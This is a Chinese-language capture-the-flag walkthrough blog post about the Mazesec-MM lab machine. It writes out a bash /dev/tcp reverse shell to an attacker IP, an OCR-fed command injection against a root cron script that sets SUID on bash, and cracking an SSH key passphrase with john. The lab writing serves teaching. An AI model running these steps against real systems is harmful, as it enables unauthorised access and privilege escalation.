+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># vncviewer 192.168.56.60:5901</span><br>Connected <span class="hljs-built_in">to</span> RFB server, <span class="hljs-keyword">using</span> protocol <span class="hljs-built_in">version</span> <span class="hljs-number">3.8</span><br>Enabling TightVNC protocol extensions<br>Performing standard VNC authentication<br>Password: <br><br></code></pre></td></tr></table></figure>
+
+<p>使用刚刚获得的用户名mingmingjiu作为密码就可以登录上去,桌面上就有user.txt</p>
+<p><img src="/2026/04/24/Mazesec-MM/vmware_oxFYjk0iUp.png" srcset="/img/loading.gif" lazyload></p>
+<p>但打开终端失败.</p>
+<p>查看index.php会发现我们的猜测是对的,后端根本没有处理参数,只是个空壳界面</p>
+<p><img src="/2026/04/24/Mazesec-MM/vmware_1XpL4IbSTJ.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在要做的事是反弹shell到我们的kali上</p>
+<p>已经通过 <code>vncviewer</code> 在 Kali 上看到 XFCE 完整桌面。即使账户 shell 是 <code>/usr/sbin/nologin</code>，XFCE 的 <strong>Application Finder (Run Program)</strong> 仍可启动任意命令。</p>
+<p>点击 <code>Applications</code> 菜单</p>
+<p>点击 <code>Run Program...</code>** 弹出 Application Finder</p>
+<p>在输入框键入反弹shell命令</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.56.104</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/Mazesec-MM/vmware_abPEvCUw8c.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# ./penelope.py <br>[+] Listening for reverse shells on <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">4444</span> →  <span class="hljs-number">127.0.0.1</span> • <span class="hljs-number">192.168.21.128</span> • <span class="hljs-number">192.168.56.104</span> • <span class="hljs-number">192.168.10.150</span> • <span class="hljs-number">172.18.0.1</span> • <span class="hljs-number">172.17.0.1</span><br>➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got reverse shell from MM-<span class="hljs-number">192.168.56.60</span>-Linux-x86_64 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! 💪<br>[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/MM~<span class="hljs-number">192.168.56</span>.<span class="hljs-number">60</span>_Linux_x86_64/<span class="hljs-number">2026_04_24</span>-<span class="hljs-number">08</span>_<span class="hljs-number">49_05-768</span>.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>mingmingjiu@MM:~$ <br><br></code></pre></td></tr></table></figure>
+
+<p>成功收到mingmingjiu身份的反弹shell</p>
+<p>上传pspy64和linpeas进行扫描</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">mingmingjiu@MM:~$ busybox wget 192.168.56.104/pspy64<br>Connecting to 192.168.56.104 (192.168.56.104:80)<br>pspy64               100% |<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**<span class="hljs-emphasis">*| 3032k  0:00:00 ETA</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">mingmingjiu@MM:~$ chmod +x pspy64 </span></span><br><span class="hljs-emphasis"><span class="hljs-strong">mingmingjiu@MM:~$ </span></span><br><span class="hljs-emphasis"><span class="hljs-strong"></span></span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">2</span>      | <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1</span>      | /sbin/init <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1566</span>   | /usr/sbin/CRON -f <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1567</span>   | /usr/sbin/CRON -f <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1569</span>   | /bin/sh -c /bin/bash /opt/a.sh <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1571</span>   | /bin/bash /opt/a.sh <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1570</span>   | /bin/bash /opt/a.sh <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1572</span>   | gocr /tmp/go.png <br><span class="hljs-attribute">2026</span>/<span class="hljs-number">04</span>/<span class="hljs-number">24</span> <span class="hljs-number">04</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">1573</span>   | sh -c pngtopnm <span class="hljs-string">&quot;/tmp/go.png&quot;</span> <br><br></code></pre></td></tr></table></figure>
+
+<p>可以看到root的定时任务以及脚本.</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs d">mingmingjiu<span class="hljs-keyword">@MM</span>:~$ cat /opt/a.sh<br><span class="hljs-meta">#!/bin/bash</span><br><br>gocr /tmp/go.png |bash<br>mingmingjiu<span class="hljs-keyword">@MM</span>:~$ <br><br></code></pre></td></tr></table></figure>
+
+<p>脚本的内容是ocr识图然后bash执行.</p>
+<p>那我们可以自己创建一个恶意的图片文件让脚本来识别并执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─<span class="hljs-comment"># convert -size 600x80 xc:white -font DejaVu-Sans-Mono-Bold \</span><br>  -pointsize <span class="hljs-number">36</span> -fill black \<br>  -annotate +<span class="hljs-number">10</span>+<span class="hljs-number">50</span> <span class="hljs-string">&#x27;chmod u+s /bin/bash&#x27;</span> \<br>  <span class="hljs-regexp">/tmp/g</span>o.png<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby">mingmingjiu<span class="hljs-variable">@MM</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd /tmp<br>mingmingjiu<span class="hljs-variable">@MM</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>wget <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span>/go.png<br>--<span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">24</span> <span class="hljs-number">04</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>--  <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.56.104/go</span>.png<br><span class="hljs-title class_">Connecting</span> to <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span>... connected.<br><span class="hljs-variable constant_">HTTP</span> request sent, awaiting response... <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span><br><span class="hljs-title class_">Length</span>: <span class="hljs-number">2846</span> (<span class="hljs-number">2</span>.8K) [image/png]<br><span class="hljs-title class_">Saving</span> <span class="hljs-symbol">to:</span> ‘go.png’<br><br>go.png                                 <span class="hljs-number">100</span><span class="hljs-string">%[===========================================================================&gt;]</span>   <span class="hljs-number">2</span>.78K  --.-<span class="hljs-variable constant_">KB</span>/s    <span class="hljs-keyword">in</span> 0s      <br><br><span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">24</span> <span class="hljs-number">04</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span> (<span class="hljs-number">348</span> <span class="hljs-variable constant_">MB</span>/s) - ‘go.png’ saved [<span class="hljs-number">2846</span>/<span class="hljs-number">2846</span>]<br><br>mingmingjiu<span class="hljs-variable">@MM</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span><br><br></code></pre></td></tr></table></figure>
+
+<p>等待一分钟后,即可看到&#x2F;bin&#x2F;bash被加上了suid位.</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mingmingjiu<span class="hljs-variable">@MM</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>ls -al /bin/bash<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">1168776</span> <span class="hljs-title class_">Apr</span> <span class="hljs-number">18</span>  <span class="hljs-number">2019</span> /bin/bash<br>mingmingjiu<span class="hljs-variable">@MM</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>二补,关于用户ll104567</p>
+<p>我们会在linpeas的扫描结果中发现大量类似ssh私钥的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">╔══════════╣ Searching root files <span class="hljs-keyword">in</span> home <span class="hljs-built_in">dirs</span> (<span class="hljs-built_in">limit</span> 30)<br>/home/                                                                                                                                                     <br>/home/mingmingjiu/Desktop/user.txt<br>/home/mingmingjiu/Downloads/id_ed10000<br>/home/mingmingjiu/Downloads/id_ed10001<br>/home/mingmingjiu/Downloads/id_ed10002<br>/home/mingmingjiu/Downloads/id_ed10003<br>/home/mingmingjiu/Downloads/id_ed10004<br>/home/mingmingjiu/Downloads/id_ed10005<br>/home/mingmingjiu/Downloads/id_ed10006<br>/home/mingmingjiu/Downloads/id_ed10007<br>/home/mingmingjiu/Downloads/id_ed10008<br>/home/mingmingjiu/Downloads/id_ed10009<br>/home/mingmingjiu/Downloads/id_ed10010<br>/home/mingmingjiu/Downloads/id_ed10011<br>/home/mingmingjiu/Downloads/id_ed10012<br>/home/mingmingjiu/Downloads/id_ed10013<br>/home/mingmingjiu/Downloads/id_ed10014<br>/home/mingmingjiu/Downloads/id_ed10015<br>/home/mingmingjiu/Downloads/id_ed10016<br>/home/mingmingjiu/Downloads/id_ed10017<br>/home/mingmingjiu/Downloads/id_ed10018<br>/home/mingmingjiu/Downloads/id_ed10019<br>/home/mingmingjiu/Downloads/id_ed10020<br>/home/mingmingjiu/Downloads/id_ed10021<br>/home/mingmingjiu/Downloads/id_ed10022<br>/home/mingmingjiu/Downloads/id_ed10023<br>/home/mingmingjiu/Downloads/id_ed10024<br>/home/mingmingjiu/Downloads/id_ed10025<br>/home/mingmingjiu/Downloads/id_ed10026<br>/home/mingmingjiu/Downloads/id_ed10027<br><br><br></code></pre></td></tr></table></figure>
+
+<p>很明显,私钥id_ed25519是正确的私钥</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# mv /root/.penelope/MM~<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.60</span>_Linux_x86_64/downloads/home/mingmingjiu/Downloads/id_ed25519 .<br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# ssh2john id_ed25519 &gt; ssh.hash<br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# john ssh.hash <span class="hljs-comment">--wordlist=rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br><span class="hljs-keyword">Cost</span> <span class="hljs-number">1</span> (KDF/cipher [<span class="hljs-number">0</span>=MD5/AES <span class="hljs-number">1</span>=MD5/<span class="hljs-number">3</span>DES <span class="hljs-number">2</span>=Bcrypt/AES]) <span class="hljs-keyword">is</span> <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br><span class="hljs-keyword">Cost</span> <span class="hljs-number">2</span> (iteration count) <span class="hljs-keyword">is</span> <span class="hljs-number">16</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">12345678</span>         (id_ed25519)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2026</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">09</span>:<span class="hljs-number">07</span>) <span class="hljs-number">1.123</span>g/s <span class="hljs-number">35.95</span>p/s <span class="hljs-number">35.95</span>c/s <span class="hljs-number">35.95</span>C/s <span class="hljs-number">123456.</span>.butterfly<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br><br></code></pre></td></tr></table></figure>
+
+<p>可以登入ll404567</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# ssh ll104567@<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.60</span> -i id_ed25519 <br>** <span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">connection</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">using</span> a post-quantum key exchange algorithm.<br>** This <span class="hljs-keyword">session</span> may be vulnerable <span class="hljs-keyword">to</span> &quot;store now, decrypt later&quot; attacks.<br>** The <span class="hljs-keyword">server</span> may need <span class="hljs-keyword">to</span> be upgraded. See https://openssh.com/pq.html<br>Enter passphrase <span class="hljs-keyword">for key</span> <span class="hljs-string">&#x27;id_ed25519&#x27;</span>: <br>Linux MM <span class="hljs-number">4.19</span><span class="hljs-number">.0</span><span class="hljs-number">-27</span>-amd64 #<span class="hljs-number">1</span> SMP Debian <span class="hljs-number">4.19</span><span class="hljs-number">.316</span><span class="hljs-number">-1</span> (<span class="hljs-number">2024</span><span class="hljs-number">-06</span><span class="hljs-number">-25</span>) x86_64<br><br>The programs included <span class="hljs-keyword">with</span> the Debian GNU/Linux <span class="hljs-keyword">system</span> are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/<span class="hljs-keyword">share</span>/doc<span class="hljs-comment">/*/copyright.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-comment">permitted by applicable law.</span><br><span class="hljs-comment">-bash-5.0$ id</span><br><span class="hljs-comment">uid=1001(ll104567) gid=1001(ll104567) groups=1001(ll104567)</span><br><span class="hljs-comment">-bash-5.0$ </span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
+
+<p>不过之后还是要回到pspy64提权.</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Mazesec/" class="print-no-link">#Mazesec</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mazesec-MM</div>
+      <div>http://example.com/2026/04/24/Mazesec-MM/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 24, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/25/OSCP-Challenge-5-OSCP-B/" title="OSCP-Challenge-5-OSCP-B">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OSCP-Challenge-5-OSCP-B</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/24/HackMyVM-Type/" title="HackMyVM-Type">
+                        <span class="hidden-mobile">HackMyVM-Type</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/random-slogan.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
